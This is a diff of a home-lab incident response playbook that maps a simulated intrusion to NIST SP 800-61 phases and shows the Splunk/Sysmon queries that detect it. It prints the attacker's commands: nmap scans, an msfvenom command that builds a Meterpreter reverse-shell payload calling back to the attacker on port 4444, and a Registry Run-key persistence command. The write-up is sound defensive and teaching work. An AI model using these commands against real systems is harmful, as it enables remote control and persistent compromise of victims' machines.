@@ -1,4 +1,3 @@
-# Splunk
 # Incident Response Playbook: Simulated Malware Execution & Persistence
 ### Splunk Incident Response Lab & Threat Triage Sandbox
 **Framework:** NIST SP 800-61 (Computer Security Incident Handling Guide)
@@ -7,7 +6,7 @@
 
 ---
 
-## 1. Overview
+##  Overview
 
 This playbook documents the detection, analysis, and response procedure for a simulated multi-stage intrusion carried out in a home SOC lab, structured according to the four phases defined in NIST SP 800-61: **Preparation**, **Detection & Analysis**, **Containment/Eradication/Recovery**, and **Post-Incident Activity**.
 
@@ -19,7 +18,7 @@ The simulated attack chain consisted of:
 
 ---
 
-## 2. Phase 1 — Preparation
+## 1. Phase 1 — Preparation
 
 Before any attack was simulated, the following visibility and infrastructure was established:
 
@@ -41,9 +40,9 @@ Before any attack was simulated, the following visibility and infrastructure was
 
 ---
 
-## 3. Phase 2 — Detection & Analysis
+## 2.  Phase 2 — Detection & Analysis
 
-### 3.1 Reconnaissance detection
+### 2.1 Reconnaissance detection
 The attacker performed service/version and vulnerability scans against the victim:
 ```bash
 nmap -sS -sV -O <Windows_IP>
@@ -51,7 +50,7 @@ nmap --script vuln 192.168.10.34
 ```
 Windows Firewall silently dropped the majority of probe packets (no response), which meant no completed connection ever reached a process — and therefore Sysmon's Event ID 3 (which only logs *established* connections) recorded nothing for this stage. This is a documented limitation encountered during the lab: **port-scan detection requires firewall-drop logging, not Sysmon, as the data source**, since Sysmon has no visibility into traffic a host never accepted.
 
-### 3.2 Payload execution detection
+### 2.2 Payload execution detection
 The attacker generated a Meterpreter reverse-TCP payload and served it for delivery:
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.33 LPORT=4444 -f exe -o Report_final.exe
@@ -72,7 +71,7 @@ index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCo
 ```
 **Analysis:** This event marks the initial execution timestamp and anchors the rest of the timeline. The `ParentImage` field identifies the launching process (browser/explorer), and `User` confirms the execution context.
 
-### 3.3 Command & Control (C2) detection
+### 2.3 Command & Control (C2) detection
 A live Meterpreter session was confirmed via `sessions -l` on the attacker side. The resulting network callback was verified in Splunk:
 ```spl
 index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 DestinationIp="<Kali_IP>"
@@ -80,7 +79,7 @@ index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCo
 ```
 **Analysis:** Repeated connections from `Report_final.exe` to the attacker's IP on port 4444, observed at short, regular intervals, are consistent with an active C2 channel rather than incidental network activity — the payload was not making a single one-off connection, but maintaining an ongoing session.
 
-### 3.4 Persistence detection
+### 2.4 Persistence detection
 From an interactive shell obtained through the Meterpreter session, a Registry Run key was created to survive reboot/logoff:
 ```
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /d "C:\Users\<user>\Downloads\Report_final.exe" /f
@@ -92,7 +91,7 @@ index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCo
 ```
 **Analysis:** The `TargetObject` field resolving to a path under `...\CurrentVersion\Run\Update`, with `Details` pointing to the malicious executable, confirms classic autorun-based persistence — mapped to **MITRE ATT&CK T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys)**.
 
-### 3.5 Full attack timeline (correlated view)
+### 2.5 Full attack timeline (correlated view)
 ```spl
 index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" Image="*Report_final.exe*" OR TargetObject="*\\Run\\*"
 | table _time, EventCode, Image, TargetObject, Details, CommandLine, DestinationIp
@@ -102,7 +101,7 @@ This single correlated view reconstructs the kill chain in chronological order: 
 
 ---
 
-## 4. Phase 3 — Containment, Eradication & Recovery
+## 3. Phase 3 — Containment, Eradication & Recovery
 
 > The steps below reflect the **documented, verified response actions** for this lab. Steps marked *(manual/for production)* were not executed against the lab VM but are included as the correct next action a SOC analyst would take in a live environment, consistent with NIST SP 800-61 guidance.
 
@@ -131,7 +130,7 @@ This single correlated view reconstructs the kill chain in chronological order: 
 
 ---
 
-## 5. Phase 4 — Post-Incident Activity
+## 4. Phase 4 — Post-Incident Activity
 
 - **Detection gap identified:** Sysmon alone could not detect the reconnaissance stage, since Windows Firewall silently dropped scan traffic before any process-level event was generated. **Recommendation:** enable Windows Firewall logging (`Set-NetFirewallProfile -LogBlocked True`) or Security Event ID 5152 auditing as a complementary data source for scan detection in future iterations.
 - **Detection tuning:** The current C2 detection relies on raw connection listing. A stronger version — calculating beacon interval regularity (jitter) via `streamstats` — would reduce false positives by distinguishing mechanically regular C2 check-ins from normal, irregular human browsing traffic, and should be adopted as the production detection query rather than the raw connection table.
